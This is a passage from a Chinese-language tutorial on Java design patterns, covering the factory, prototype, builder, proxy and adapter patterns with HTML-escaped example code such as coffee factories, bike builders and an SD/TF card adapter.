createCoffee() &#123;        return new AmericanCoffee();    &#125;&#125;\n\n咖啡店类：\npublic class CoffeeStore &#123;    private CoffeeFactory factory;        public CoffeeStore(CoffeeFactory factory) &#123;        this.factory = factory;    &#125;        public Coffee orderCoffee(String type) &#123;        Coffee coffee = factory.createCoffee();        coffee.addMilk();        coffee.addsugar();        return coffee;    &#125;&#125;\n\n优缺点优点：\n\n用户只需要知道具体工厂的名称就可得到所要的产品，无须知道产品的具体创建过程\n在系统增加新的产品时只需要添加具体产品类和对应的具体工厂类，无须对原工厂进行任何修改，满足开闭原侧；缺点：\n每增加一个产品就要增加一个具体产品类和一个对应的具体工厂类，这增加了系统的复杂度。\n\n抽象工厂模式前面介绍的工厂方法模式中考虑的是一类产品的生产，如畜牧场只养动物、电视机厂只生产电视机等。这些工厂只生产同种类产品，同种类产品称为同等级产品，也就是说：工厂方法模式只考虑生产同等级的产品，但是在现实生活中许多工厂是综合型的工厂，能生产多等级（种类）的产品，如电器厂既生产电视机又生产洗衣机或空调，大学既有软件专业又有生物专业等。抽象工厂模式将考虑多等级产品的生产，将同一个具体工所生产的位于不同等级的一组产品称为一个产品族。比如下图中，横轴是产品等级，也就是同一类产品；纵轴是产品族，也就是同一品牌的产品，同一品牌的产品产自同一个工厂。\n概念是一种为访问类提供一个创建阻相关或相互依赖对象的接口，且访问类无须指定所要产品的具体类就能得到同族的不同等级的产品的模式结构。抽象工厂模式是工厂方法模式的升级版本，工厂方法模式只生产一个等级的产品，而抽象工厂模式可生产多个等级的产品。\n结构抽象工厂模式的主要角色如下：\n\n抽象工厂(Abstract Factory):提供了创建产品的接口，它包含多个创建产品的方法，可以创建多个不同等级的产品。\n具体工厂(Concrete Factory):主要是实现抽象工厂中的多个抽象方法，完成具体产品的创建。\n抽象产品(Product)：定义了产品的规范，描述了产品的主要特性和功能，抽象工厂模式有多个抽象产品。\n具体产品(ConcreteProduct)：实现了抽象产品角色所定义的接口，由具体工厂来创建，它同具体工厂之间是多对一的关系。\n\n实现现咖啡店业务发生改变，不仅要生产咖啡还要生产甜点，如提拉米苏、抹茶慕斯等，要是按照工厂方法模式，需要定义提拉米苏类、抹茶慕斯类、提拉米苏工厂、抹茶慕斯工厂、甜点工厂类，很容易发生类爆炸情况。其中拿铁咖啡、美式咖啡是一个产品等级，都是咖啡；提拉米苏、抹茶慕斯也是一个产品等级；拿铁咖啡和提拉米苏是同一产品族（也就是都属于意大利风味），美式咖啡和抹茶慕斯是同一产品族（也就是都属于美式风味）。所以这个案例可以使用抽象工厂模式实现。\n\n如果需要添加一个产品族，只需要再添加一个对应的工厂类即可，不需要修改其他的类。\n\n抽象工厂：\npublic interface DessertFactory &#123;    Coffee createCoffee();    Dessert createDessert();&#125;\n\n具体工厂：\n//美式甜点工厂public class AmericanDessertFactory implements DessertFactory &#123;    public Coffee createCoffee() &#123;        return new AmericanCoffee();    &#125;        public Dessert createDessert() &#123;        return new MatchaMousse();    &#125;&#125;//意大利风味甜点工厂public class ItalyDessertFactory implements DessertFactory &#123;    public Coffee createCoffee() &#123;        return new LatteCoffee();    &#125;        public Dessert createDessert() &#123;        return new Tiramisu();    &#125;&#125;\n\n优缺点优点：当一个产品族中的多个对象被设计成一起工作时，它能保证客户端始终只使用同一个产品族中的对象。缺点：当产品族中需要增加一个新的产品时，所有的工厂类都需要进行修改。\n使用场景\n当需要创建的对象是一系列相互关联或相互依赖的产品族时，如电器工厂中的电视机、洗衣机、空调等。\n系统中有多个产品族，但每次只使用其中的某一族产品。如有人只喜欢穿某一个品牌的衣服和鞋。\n系统中提供了产品的类库，且所有产品的接口相同，客户端不依赖产品实例的创建细节和内部结构。如：输入法换皮肤，一整套一起换。生成不同操作系统的程序。\n\n模式拓展简单工厂 + 配置文件解除耦合可以通过工厂模式 + 配置文件的方式解除工厂对象和产品对象的耦合在工厂类中加载配置文件中的全类名，并创建对象进行存储，客户端如果需要对象，直接进行获取即可。\n\n定义配置文件american=org.example.designPatterns.pattern.factory.configFactory.AmericanCoffeelatte=org.example.designPatterns.pattern.factory.configFactory.LatteCoffee\n改进工厂类import java.io.IOException;import java.io.InputStream;import java.util.HashMap;import java.util.Properties;import java.util.Set;public class CoffeeFactory &#123;    // 加载配置文件，获取配置文件中配置的全类名，并创建该类的对象进行存储    // 定义容器存储对象    private static HashMap&lt;String, Coffee&gt; map = new HashMap&lt;&gt;();    // 加载配置文件    static &#123;        // 创建Properties对象        Properties p = new Properties();        // 调用load方法加载配置文件        InputStream is = CoffeeFactory.class.getClassLoader().getResourceAsStream(&quot;bean.properties&quot;);        try &#123;            p.load(is);            // 从p集合中获取全类名，并创建对象            Set&lt;Object&gt; keys = p.keySet();            for (Object key : keys) &#123;                String className = p.getProperty((String) key);                // 通过反射创建对象                Class&lt;?&gt; clazz = Class.forName(className);                Coffee coffee = (Coffee) clazz.newInstance();                // 将名称和对象存储到容器中                map.put((String) key, coffee);            &#125;        &#125; catch (IOException | IllegalAccessException | InstantiationException | ClassNotFoundException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public static Coffee createCoffee(String name) &#123;        return map.get(name);    &#125;&#125;\n\n静态成员变量用来存储创建的对象（键存储的是名称，值存储的是对应的对象），而读取配置文件以及创建对象写在静态代码块中，目的就是只需要执行一次。\nJDK中的工厂模式的应用（Collection.iterator）import java.util.LinkedList;import java.util.List;public class Main &#123;    public static void main(String[] args) &#123;        List&lt;String&gt; list = new LinkedList&lt;&gt;();        list.add(&quot;许嵩&quot;);        list.add(&quot;徐良&quot;);        list.add(&quot;汪苏泷&quot;);        // 获取迭代器对象        Iterator&lt;String&gt; iterator = list.iterator();        // 使用迭代器遍历        for (String element : list) &#123;            System.out.println(element);        &#125;    &#125;&#125;\n\n使用迭代器遍历集合，获取集合中的元素。而单列集合获取迭代器的方法就使用到了工厂方法模式。\nCollection接口是抽象工厂类，ArrayList是具体的工厂类；Iterator接口是抽象商品类，ArrayList类中的Iter内部类是具体的商品类。在具体的工厂类中iterator()方法创建具体的商品类的对象。\n\n1,DateForamt类中的getInstance()方法使用的是工厂模式；2,Calendar类中的getInstance()方法使用的是工厂模式；\n\n原型模式概述用一个已经创建的实例作为原型，通过复制该原型对象来创建一个和原型对象相同的新对象。\n结构原型模式包含如下角色：\n\n抽象原型类：规定了具体原型对象必须实现的的 clone() 方法。\n具体原型类：实现抽象原型类的 clone() 方法，它是可被复制的对象。\n访问类：使用具体原型类中的 clone() 方法来复制新的对象。\n\n\n实现原型模式的克隆分为浅克隆和深克隆。\n\n浅克隆：创建一个新对象，新对象的属性和原来对象完全相同，对于非基本类型属性，仍指向原有属性所指向的对象的内存地址。深克隆：创建一个新对象，属性中引用的其他对象也会被克隆，不再指向原有对象地址。\n\nJava中的Object类中提供了 clone() 方法来实现浅克隆。Cloneable 接口是上面的类图中的抽象原型类，而实现了Cloneable接口的子实现类就是具体的原型类。\nRealizetype（具体的原型类）：\npublic class Realizetype implements Cloneable &#123;    public Realizetype() &#123;        System.out.println(&quot;具体的原型对象创建完成！&quot;);    &#125;        @Override    protected Realizetype clone() throws CloneNotSupportedException &#123;        System.out.println(&quot;具体原型复制成功！&quot;);        return (Realizetype) super.clone();    &#125;&#125;\n\nPrototypeTest（测试访问类）：\npublic class PrototypeTest &#123;    public static void main(String[] args) throws CloneNotSupportedException &#123;        Realizetype r1 = new Realizetype();        Realizetype r2 = r1.clone();        System.out.println(&quot;对象r1和r2是同一个对象？&quot; + (r1 == r2));    &#125;&#125;\n\n案例用原型模式生成“三好学生”奖状同一学校的“三好学生”奖状除了获奖人姓名不同，其他都相同，可以使用原型模式复制多个“三好学生”奖状出来，然后在修改奖状上的名字即可。\n\n代码如下：\n//奖状类public class Citation implements Cloneable &#123;    private String name;    public void setName(String name) &#123;        this.name = name;    &#125;    public String getName() &#123;        return (this.name);    &#125;    public void show() &#123;        System.out.println(name + &quot;同学：在2020学年第一学期中表现优秀，被评为三好学生。特发此状！&quot;);    &#125;    @Override    public Citation clone() throws CloneNotSupportedException &#123;        return (Citation) super.clone();    &#125;&#125;//测试访问类public class CitationTest &#123;    public static void main(String[] args) throws CloneNotSupportedException &#123;        Citation c1 = new Citation();        c1.setName(&quot;张三&quot;);        //复制奖状        Citation c2 = c1.clone();        //将奖状的名字修改李四        c2.setName(&quot;李四&quot;);        c1.show();        c2.show();    &#125;&#125;\n\n使用场景\n对象的创建非常复杂，可以使用原型模式快捷的创建对象。\n性能和安全要求比较高。\n\n拓展（深克隆）因为浅克隆的属性和原来对象完全相同。对于基本类型：String、Integer 等包装类都是不可变的对象，当需要修改不可变对象的值时，需要在内存中生成一个新的对象来存放新的值，然后将原来的引用指向新的地址对于非基本类型（引用类型）：克隆的新对象的引用类型的属性仍会指向原来对象引用类型属性的内存地址\n实现深拷贝的两种方式：\n\n实现 Cloneable 接口\n实现 Serializable 接口\n\n详细的晚点新写一篇博客\n建造者模式概述将一个复杂对象的构建与表示分离，使得同样的构建过程可以创建不同的表示。\n\n分离了部件的构造(由Builder来负责)和装配(由Director负责)。 从而可以构造出复杂的对象。这个模式适用于：某个对象的构建过程复杂的情况。\n由于实现了构建和装配的解耦。不同的构建器，相同的装配，也可以做出不同的对象；相同的构建器，不同的装配顺序也可以做出不同的对象。也就是实现了构建算法、装配算法的解耦，实现了更好的复用。\n建造者模式可以将部件和其组装过程分开，一步一步创建一个复杂的对象。用户只需要指定复杂对象的类型就可以得到该对象，而无须知道其内部的具体构造细节。\n\n结构建造者（Builder）模式包含如下角色：\n\n抽象建造者类（Builder）：这个接口规定要实现复杂对象的那些部分的创建，并不涉及具体的部件对象的创建。\n具体建造者类（ConcreteBuilder）：实现 Builder 接口，完成复杂产品的各个部件的具体创建方法。在构造过程完成后，提供产品的实例。\n产品类（Product）：要创建的复杂对象。\n指挥者类（Director）：调用具体建造者来创建复杂对象的各个部分，在指导者中不涉及具体产品的信息，只负责保证对象各部分完整创建或按某种顺序创建。\n\n\n实例创建共享单车生产自行车是一个复杂的过程，它包含了车架，车座等组件的生产。而车架又有碳纤维，铝合金等材质的，车座有橡胶，真皮等材质。对于自行车的生产就可以使用建造者模式。这里Bike是产品，包含车架，车座等组件；Builder是抽象建造者，MobikeBuilder和OfoBuilder是具体的建造者；Director是指挥者。类图如下：\n\n//自行车类public class Bike &#123;    private String frame;    private String seat;    public String getFrame() &#123;        return frame;    &#125;    public void setFrame(String frame) &#123;        this.frame = frame;    &#125;    public String getSeat() &#123;        return seat;    &#125;    public void setSeat(String seat) &#123;        this.seat = seat;    &#125;&#125;// 抽象 builder 类public abstract class Builder &#123;    protected Bike mBike = new Bike();    public abstract void buildFrame();    public abstract void buildSeat();    public abstract Bike createBike();&#125;//摩拜单车Builder类public class MobikeBuilder extends Builder &#123;    @Override    public void buildFrame() &#123;        mBike.setFrame(&quot;铝合金车架&quot;);    &#125;    @Override    public void buildSeat() &#123;        mBike.setSeat(&quot;真皮车座&quot;);    &#125;    @Override    public Bike createBike() &#123;        return mBike;    &#125;&#125;//ofo单车Builder类public class OfoBuilder extends Builder &#123;    @Override    public void buildFrame() &#123;        mBike.setFrame(&quot;碳纤维车架&quot;);    &#125;    @Override    public void buildSeat() &#123;        mBike.setSeat(&quot;橡胶车座&quot;);    &#125;    @Override    public Bike createBike() &#123;        return mBike;    &#125;&#125;//指挥者类public class Director &#123;    private Builder mBuilder;    public Director(Builder builder) &#123;        mBuilder = builder;    &#125;    public Bike construct() &#123;        mBuilder.buildFrame();        mBuilder.buildSeat();        return mBuilder.createBike();    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        showBike(new OfoBuilder());        showBike(new MobikeBuilder());    &#125;    private static void showBike(Builder builder) &#123;        Director director = new Director(builder);        Bike bike = director.construct();        System.out.println(bike.getFrame());        System.out.println(bike.getSeat());    &#125;&#125;\n\n上面示例是 Builder模式的常规用法，指挥者类 Director 在建造者模式中具有很重要的作用，它用于指导具体构建者如何构建产品，控制调用先后次序，并向调用者返回完整的产品类，但是有些情况下需要简化系统结构，可以把指挥者类和抽象建造者进行结合。但同时也会也加重了抽象建造者类的职责，也不是太符合单一职责原则，如果construct() 过于复杂，建议还是封装到 Director 中。\n// 抽象 builder 类public abstract class Builder &#123;    protected Bike mBike = new Bike();    public abstract void buildFrame();    public abstract void buildSeat();    public abstract Bike createBike();        public Bike construct() &#123;        this.buildFrame();        this.BuildSeat();        return this.createBike();    &#125;&#125;\n\n优缺点优点：\n\n建造者模式的封装性很好。使用建造者模式可以有效的封装变化，在使用建造者模式的场景中，一般产品类和建造者类是比较稳定的，因此，将主要的业务逻辑封装在指挥者类中对整体而言可以取得比较好的稳定性。\n在建造者模式中，客户端不必知道产品内部组成的细节，将产品本身与产品的创建过程解耦，使得相同的创建过程可以创建不同的产品对象。\n可以更加精细地控制产品的创建过程 。将复杂产品的创建步骤分解在不同的方法中，使得创建过程更加清晰，也更方便使用程序来控制创建过程。\n建造者模式很容易进行扩展。如果有新的需求，通过实现一个新的建造者类就可以完成，基本上不用修改之前已经测试通过的代码，因此也就不会对原有功能引入风险。符合开闭原则。缺点：\n造者模式所创建的产品一般具有较多的共同点，其组成部分相似，如果产品之间的差异性很大，则不适合使用建造者模式，因此其使用范围受到一定的限制。\n\n使用场景建造者（Builder）模式创建的是复杂对象，其产品的各个部分经常面临着剧烈的变化，但将它们组合在一起的算法却相对稳定，所以它通常在以下场合使用。\n\n创建的对象较复杂，由多个部件构成，各部件面临着复杂的变化，但构件间的建造顺序是稳定的。\n创建复杂对象的算法独立于该对象的组成部分以及它们的装配方式，即产品的构建过程和最终的表示是独立的。\n\n模式扩展建造者模式除了上面的用途外，在开发中还有一个常用的使用方式，就是当一个类构造器需要传入很多参数时，如果创建这个类的实例，代码可读性会非常差，而且很容易引入错误，此时就可以利用建造者模式进行重构。\n重构前代码：\npublic class PhoneBefore &#123;    private String cpu;    private String screen;    private String memory;    private String mainboard;    public PhoneBefore(String cpu, String screen, String memory, String mainboard) &#123;        this.cpu = cpu;        this.screen = screen;        this.memory = memory;        this.mainboard = mainboard;    &#125;    public String getCpu() &#123;        return cpu;    &#125;    public void setCpu(String cpu) &#123;        this.cpu = cpu;    &#125;    public String getScreen() &#123;        return screen;    &#125;    public void setScreen(String screen) &#123;        this.screen = screen;    &#125;    public String getMemory() &#123;        return memory;    &#125;    public void setMemory(String memory) &#123;        this.memory = memory;    &#125;    public String getMainboard() &#123;        return mainboard;    &#125;    public void setMainboard(String mainboard) &#123;        this.mainboard = mainboard;    &#125;    @Override    public String toString() &#123;        return &quot;PhoneBefore&#123;&quot; +                &quot;cpu=&#x27;&quot; + cpu + &#x27;\\&#x27;&#x27; +                &quot;, screen=&#x27;&quot; + screen + &#x27;\\&#x27;&#x27; +                &quot;, memory=&#x27;&quot; + memory + &#x27;\\&#x27;&#x27; +                &quot;, mainboard=&#x27;&quot; + mainboard + &#x27;\\&#x27;&#x27; +                &#x27;&#125;&#x27;;    &#125;&#125;\n\n重构后的代码：\npublic class PhoneAfter &#123;    private String cpu;    private String screen;    private String memory;    private String mainboard;    private PhoneAfter(Builder builder) &#123;        this.cpu = builder.cpu;        this.screen = builder.screen;        this.memory = builder.memory;        this.mainboard = builder.mainboard;    &#125;    public static final class Builder&#123;        private String cpu;        private String screen;        private String memory;        private String mainboard;        public Builder() &#123;        &#125;        public Builder cpu(String val) &#123;            cpu = val;            return this;        &#125;        public Builder screen(String val) &#123;            screen = val;            return this;        &#125;        public Builder memory(String val) &#123;            memory = val;            return this;        &#125;        public Builder mainboard(String val) &#123;            mainboard = val;            return this;        &#125;        public PhoneAfter build()&#123;            return new PhoneAfter(this);        &#125;    &#125;    @Override    public String toString() &#123;        return &quot;PhoneAfter&#123;&quot; +                &quot;cpu=&#x27;&quot; + cpu + &#x27;\\&#x27;&#x27; +                &quot;, screen=&#x27;&quot; + screen + &#x27;\\&#x27;&#x27; +                &quot;, memory=&#x27;&quot; + memory + &#x27;\\&#x27;&#x27; +                &quot;, mainboard=&#x27;&quot; + mainboard + &#x27;\\&#x27;&#x27; +                &#x27;&#125;&#x27;;    &#125;&#125;\n\n测试代码：\npublic class Client &#123;    public static void main(String[] args) &#123;        PhoneBefore phoneBefore = new PhoneBefore(&quot;intel&quot;,&quot;华硕&quot;,&quot;金士顿&quot;,&quot;三星&quot;);        PhoneAfter phoneAfter = new PhoneAfter.Builder()                .cpu(&quot;intel&quot;)                .mainboard(&quot;华硕&quot;)                .memory(&quot;金士顿&quot;)                .screen(&quot;三星&quot;)                .build();        System.out.println(phoneBefore);        System.out.println(phoneAfter);    &#125;&#125;\n\n从测试类的代码中可以看出，重构前的代码创建Phone对象时，如果参数过多，代码的可读性较差且使用成本比较高。重构后的代码使用起来更加方便，这种方式也叫链式调用。\n创建者模式对比工厂方法模式VS建造者模式工厂方法模式注重的是整体对象的创建方式；而建造者模式注重的是部件构建的过程，意在通过一步一步地精确构造创建出一个复杂的对象。\n我们举个简单例子来说明两者的差异，如要制造一个超人。如果使用工厂方法模式，直接产生出来的就是一个力大无穷、能够飞翔、内裤外穿的超人；而如果使用建造者模式，则需要组装手、头、脚、躯干等部分，然后再把内裤外穿，于是一个超人就诞生了。\n抽象工厂模式VS建造者模式抽象工厂模式实现对产品家族的创建，一个产品家族是这样的一系列产品：具有不同分类维度的产品组合，采用抽象工厂模式则是不需要关心构建过程，只关心什么产品由什么工厂生产即可。建造者模式则是要求按照指定的蓝图建造产品，它的主要目的是通过组装零配件而产生一个新产品。\n如果将抽象工厂模式看成汽车配件生产工厂，生产一个产品族的产品，那么建造者模式就是一个汽车组装工厂，通过对部件的组装可以返回一辆完整的汽车\n结构型模式结构型模式描述如何将类或对象按某种布局组成更大的结构。它分为类结构型模式和对象结构型模式，前者采用继承机制来组织接口和类，后者釆用组合或聚合来组合对象。由于组合关系或聚合关系比继承关系耦合度低，满足“合成复用原则”，所以对象结构型模式比类结构型模式具有更大的灵活性。\n结构型模式分为以下 7 种：\n\n代理模式\n适配器模式\n装饰者模式\n桥接模式\n外观模式\n组合模式\n享元模式\n\n代理模式概述由于某些原因需要给某对象提供一个代理以控制对该对象的访问。这时，访问对象不适合或者不能直接引用目标对象，代理对象作为访问对象和目标对象之间的中介。Java中的代理按照代理类生成时机不同又分为静态代理和动态代理。静态代理代理类在编译期就生成，而动态代理代理类则是在Java运行时动态生成。动态代理又有JDK代理和CGLib代理两种。\n结构代理（Proxy）模式分为三种角色：\n\n抽象主题（Subject）类： 通过接口或抽象类声明真实主题和代理对象实现的业务方法。\n真实主题（Real Subject）类： 实现了抽象主题中的具体业务，是代理对象所代表的真实对象，是最终要引用的对象。\n代理（Proxy）类 ： 提供了与真实主题相同的接口，其内部含有对真实主题的引用，它可以访问、控制或扩展真实主题的功能。\n\n静态代理例：火车站卖票如果要买火车票的话，需要去火车站买票，坐车到火车站，排队等一系列的操作，显然比较麻烦。而火车站在多个地方都有代售点，我们去代售点买票就方便很多了。这个例子其实就是典型的代理模式，火车站是目标对象，代售点是代理对象。类图如下：\n\nProxyPoint作为访问对象和目标对象的中介。同时也对sell方法进行了增强（代理点收取一些服务费用）。\n//卖票接口public interface SellTickets &#123;    void sell();&#125;//火车站  火车站具有卖票功能，所以需要实现SellTickets接口public class TrainStation implements SellTickets &#123;    public void sell() &#123;        System.out.println(&quot;火车站卖票&quot;);    &#125;&#125;//代售点public class ProxyPoint implements SellTickets &#123;    private TrainStation station = new TrainStation();    public void sell() &#123;        System.out.println(&quot;代理点收取一些服务费用&quot;);        station.sell();    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        ProxyPoint pp = new ProxyPoint();        pp.sell();    &#125;&#125;\n\nJDK动态代理Java中提供了一个动态代理类Proxy。Proxy并不是我们上述所说的代理对象的类，而是提供了一个创建代理对象的静态方法（newProxyInstance方法）来获取代理对象。\n代理工厂：用于获取动态代理对象\nimport java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;// 代理工厂，用来创建代理对象public class ProxyFactory &#123;    // 声明目标对象    private TrainStation station = new TrainStation();    public SellTickets getProxyObject() &#123;        //使用Proxy获取代理对象        /*            newProxyInstance()方法参数说明：                ClassLoader loader ： 类加载器，用于加载代理类，使用真实对象的类加载器即可                Class&lt;?&gt;[] interfaces ： 真实对象所实现的接口，代理模式真实对象和代理对象实现相同的接口                InvocationHandler h ： 代理对象的调用处理程序         */        SellTickets sellTickets = (SellTickets) Proxy.newProxyInstance(                station.getClass().getClassLoader(),                station.getClass().getInterfaces(),                new InvocationHandler() &#123;                    /*                        InvocationHandler中invoke方法参数说明：                            proxy ： 代理对象                            method ： 对应于在代理对象上调用的接口方法的 Method 实例                            args ： 代理对象调用接口方法时传递的实际参数                     */                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;                        System.out.println(&quot;代理点收取一些服务费用(JDK动态代理方式)&quot;);                        //执行真实对象                        Object result = method.invoke(station, args);                        return result;                    &#125;                &#125;);        return sellTickets;    &#125;&#125;\n\njdk动态创建的代理类（异常处理等其他无关代码已删除）：\n//程序运行过程中动态生成的代理类public final class $Proxy0 extends Proxy implements SellTickets &#123;    private static Method m3;    public $Proxy0(InvocationHandler invocationHandler) &#123;        super(invocationHandler);    &#125;    static &#123;        m3 = Class.forName(&quot;com.itheima.proxy.dynamic.jdk.SellTickets&quot;).getMethod(&quot;sell&quot;, new Class[0]);    &#125;    public final void sell() &#123;        this.h.invoke(this, m3, null);    &#125;&#125;\n\n执行流程：\n\n通过代理工厂获取动态创建的代理类对象（执行过程中创建的代理类）\n调用代理对象的sell()方法\n根据多态的特性，执行的是代理类（$Proxy0）中的sell()方法\n代理类（$Proxy0）中的sell()方法中又调用了InvocationHandler接口的子实现类对象的invoke方法\ninvoke方法通过反射执行了真实对象所属类(TrainStation)中的sell()方法\n\nCGLIB动态代理如果没有定义SellTickets接口，只定义了TrainStation(火车站类)。很显然JDK代理是无法使用了，因为JDK动态代理要求必须定义接口，对接口进行代理。CGLIB是一个功能强大，高性能的代码生成包。它为没有实现接口的类提供代理，为JDK的动态代理提供了很好的补充。CGLIB是第三方提供的包，所以需要引入jar包的坐标：\n&lt;dependency&gt;    &lt;groupId&gt;cglib&lt;/groupId&gt;    &lt;artifactId&gt;cglib&lt;/artifactId&gt;    &lt;version&gt;2.2.2&lt;/version&gt;&lt;/dependency&gt;\n\n\ncglib 是未维护的，在高版本的jdk中是无法正常运行的。目前看来jdk17是不行的（2022-11-24）在jdk8中是正常运行的。（果然还得是8）引发错误似乎与增强器有关，在初始化Enhancer类时会出现：java.lang.ExceptionInInitializerError解决办法：\n\n使用低版本的jdk，比如jdk8\n迁移至 ByteBuddy \nSpring Framework维护了cglib的补丁（包括jdk17的兼容性）。github地址\n\n\n代码如下：\nimport net.sf.cglib.proxy.Enhancer;import net.sf.cglib.proxy.MethodInterceptor;import net.sf.cglib.proxy.MethodProxy;import java.lang.reflect.Method;// 代理对象工厂public class ProxyFactory implements MethodInterceptor &#123;    private TrainStation target = new TrainStation();    public TrainStation getProxyObject() &#123;        //创建Enhancer对象，类似于JDK动态代理的Proxy类，下一步就是设置几个参数        Enhancer enhancer = new Enhancer();        //设置父类的字节码对象        enhancer.setSuperclass(target.getClass());        //设置回调函数        enhancer.setCallback(this);        //创建代理对象        TrainStation obj = (TrainStation) enhancer.create();        return obj;    &#125;    /*        intercept方法参数说明：            o ： 代理对象            method ： 真实对象中的方法的Method实例            args ： 实际参数            methodProxy ：代理对象中的方法的method实例     */    public TrainStation intercept(Object o, Method method, Object[] args, MethodProxy methodProxy) throws Throwable &#123;        System.out.println(&quot;代理点收取一些服务费用(CGLIB动态代理方式)&quot;);        TrainStation result = (TrainStation) methodProxy.invokeSuper(o, args);        return result;    &#125;&#125;\n\n三种代理的对比\njdk代理和CGLIB代理使用CGLib实现动态代理，CGLib底层采用ASM字节码生成框架，使用字节码技术生成代理类，在JDK1.6之前比使用Java反射效率要高。唯一需要注意的是，CGLib不能对声明为final的类或者方法进行代理，因为CGLib原理是动态生成被代理类的子类。在JDK1.6、JDK1.7、JDK1.8逐步对JDK动态代理优化之后，在调用次数较少的情况下，JDK代理效率高于CGLib代理效率，只有当进行大量调用的时候，JDK1.6和JDK1.7比CGLib代理效率低一点，但是到JDK1.8的时候，JDK代理效率高于CGLib代理。所以如果有接口使用JDK动态代理，如果没有接口使用CGLIB代理。\n动态代理和静态代理动态代理与静态代理相比较，最大的好处是接口中声明的所有方法都被转移到调用处理器一个集中的方法中处理（InvocationHandler.invoke）。这样，在接口方法数量比较多的时候，我们可以进行灵活处理，而不需要像静态代理那样每一个方法进行中转。如果接口增加一个方法，静态代理模式除了所有实现类需要实现这个方法外，所有代理类也需要实现此方法。增加了代码维护的复杂度。而动态代理不会出现该问题\n\n优缺点优点：\n\n代理模式在客户端与目标对象之间起到一个中介作用和保护目标对象的作用；\n代理对象可以扩展目标对象的功能；\n代理模式能将客户端与目标对象分离，在一定程度上降低了系统的耦合度；\n\n缺点：\n\n增加了系统的复杂度；\n\n使用场景\n远程（Remote）代理本地服务通过网络请求远程服务。为了实现本地到远程的通信，我们需要实现网络通信，处理其中可能的异常。为良好的代码设计和可维护性，我们将网络通信部分隐藏起来，只暴露给本地服务一个接口，通过该接口即可访问远程服务提供的功能，而不必过多关心通信部分的细节。（RPC思想，例如 Dubbo框架）\n防火墙（Firewall）代理当你将浏览器配置成使用代理功能时，防火墙就将你的浏览器的请求转给互联网；当互联网返回响应时，代理服务器再把它转给你的浏览器。\n保护（Protect or Access）代理控制对一个对象的访问，如果需要，可以给不同的用户提供不同级别的使用权限。\n\n适配器模式概述如果去欧洲国家去旅游的话，他们的插座如下图最左边，是欧洲标准。而我们使用的插头如下图最右边的。因此我们的笔记本电脑，手机在当地不能直接充电。所以就需要一个插座转换器，转换器第1面插入当地的插座，第2面供我们充电，这样使得我们的插头在当地能使用。生活中这样的例子很多，手机充电器（将220v转换为5v的电压），读卡器等，其实就是使用到了适配器模式。\n\n定义：将一个类的接口转换成客户希望的另外一个接口，使得原本由于接口不兼容而不能一起工作的那些类能一起工作。适配器模式分为类适配器模式和对象适配器模式，前者类之间的耦合度比后者高，且要求程序员了解现有组件库中的相关组件的内部结构，所以应用相对较少些。\n结构适配器模式（Adapter）包含以下主要角色：\n\n目标（Target）接口：当前系统业务所期待的接口，它可以是抽象类或接口。\n适配者（Adaptee）类：它是被访问和适配的现存组件库中的组件接口。\n适配器（Adapter）类：它是一个转换器，通过继承或引用适配者的对象，把适配者接口转换成目标接口，让客户按目标接口的格式访问适配者。\n\n类适配器模式实现方式：定义一个适配器类来实现当前系统的业务接口，同时又继承现有组件库中已经存在的组件。\n例：读卡器现有一台电脑只能读取SD卡，而要读取TF卡中的内容的话就需要使用到适配器模式。创建一个读卡器，将TF卡中的内容读取出来。类图如下：\n代码如下：\n//SD卡的接口public interface SDCard &#123;    //读取SD卡方法    String readSD();    //写入SD卡功能    void writeSD(String msg);&#125;//SD卡实现类public class SDCardImpl implements SDCard &#123;    public String readSD() &#123;        String msg = &quot;sd card read a msg :hello word SD&quot;;        return msg;    &#125;    public void writeSD(String msg) &#123;        System.out.println(&quot;sd card write msg : &quot; + msg);    &#125;&#125;//电脑类public class Computer &#123;    public String readSD(SDCard sdCard) &#123;        if(sdCard == null) &#123;            throw new NullPointerException(&quot;sd card null&quot;);        &#125;        return sdCard.readSD();    &#125;&#125;//TF卡接口public interface TFCard &#123;    //读取TF卡方法    String readTF();    //写入TF卡功能    void writeTF(String msg);&#125;//TF卡实现类public class TFCardImpl implements TFCard &#123;    public String readTF() &#123;        String msg =&quot;tf card read msg : hello word tf card&quot;;        return msg;    &#125;    public void writeTF(String msg) &#123;        System.out.println(&quot;tf card write a msg : &quot; + msg);    &#125;&#125;//定义适配器类（SD兼容TF）public class SDAdapterTF extends TFCardImpl implements SDCard &#123;    public String readSD() &#123;        System.out.println(&quot;adapter read tf card &quot;);        return readTF();    &#125;    public void writeSD(String msg) &#123;        System.out.println(&quot;adapter write tf card&quot;);        writeTF(msg);    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        Computer computer = new Computer();        SDCard sdCard = new SDCardImpl();        System.out.println(computer.readSD(sdCard));        System.out.println(&quot;------------&quot;);        SDAdapterTF adapter = new SDAdapterTF();        System.out.println(computer.readSD(adapter));    &#125;&#125;\n\n类适配器模式违背了合成复用原则。类适配器是客户类有一个接口规范的情况下可用，反之不可用。\n对象适配器模式实现方式：对象适配器模式可釆用将现有组件库中已经实现的组件引入适配器类中，该类同时实现当前系统的业务接口。\n例：读卡器我们使用对象适配器模式将读卡器的案例进行改写。类图如下：\n\n代码如下：类适配器模式的代码，我们只需要修改适配器类（SDAdapterTF）和测试类。\n//创建适配器对象（SD兼容TF）public class SDAdapterTF  implements SDCard &#123;    private TFCard tfCard;    public SDAdapterTF(TFCard tfCard) &#123;        this.tfCard = tfCard;    &#125;    public String readSD() &#123;        System.out.println(&quot;adapter read tf card &quot;);        return tfCard.readTF();    &#125;    public void writeSD(String msg) &#123;        System.out.println(&quot;adapter write tf card&quot;);        tfCard.writeTF(msg);    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        Computer computer = new Computer();        SDCard sdCard = new SDCardImpl();        System.out.println(computer.readSD(sdCard));        System.out.println(&quot;------------&quot;);        TFCard tfCard = new TFCardImpl();        SDAdapterTF adapter = new SDAdapterTF(tfCard);        System.out.println(computer.readSD(adapter));    &#125;&#125;\n\n\n注意：还有一个适配器模式是接口适配器模式。当不希望实现一个接口中所有的方法时，可以创建一个抽象类Adapter 